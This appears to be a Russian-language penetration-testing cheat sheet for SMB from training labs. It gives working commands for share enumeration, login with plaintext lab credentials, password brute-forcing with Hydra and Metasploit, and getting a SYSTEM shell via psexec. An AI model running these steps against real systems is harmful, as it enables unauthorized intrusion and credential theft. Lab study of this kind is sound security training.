# SMB - это протокол для работы с файлами и принтерами в сетях Windows
# Обычно работает на 445 порту

# 1. Разведка (Enumerate SMB)
# Посмотреть доступные шары (анонимно)
smbclient -L //10.48.181.120 -N

# 2. Подключение к конкретному шару
# Формат: //IP/ШАРА -U 'пользователь%пароль'
smbclient //10.48.181.120/milesdyson -U 'miles%cyborg007haloterminator'

# 3. Брутфорс паролей через Hydra
# (-t 1 рекомендуется для SMB, так как он не любит много соединений)
hydra -l miles -P pass.txt 10.48.181.120 smb -V -t 1

# 4. Брутфорс через Metasploit (надежнее)
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set RHOSTS 10.48.181.120
msf6 > set SMBUser miles
msf6 > set PASS_FILE /path/to/passwords.txt
msf6 > run

# 5. Перечисление доступных шар через Metasploit
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 > set RHOSTS 10.48.181.120
msf6 > run

# 6. Если знаем админские креды через psexec создается сервис и записывается в админскую шару, после получаем шелл от system
psexec.py administrator:qwertyuiop@demo.ine.local 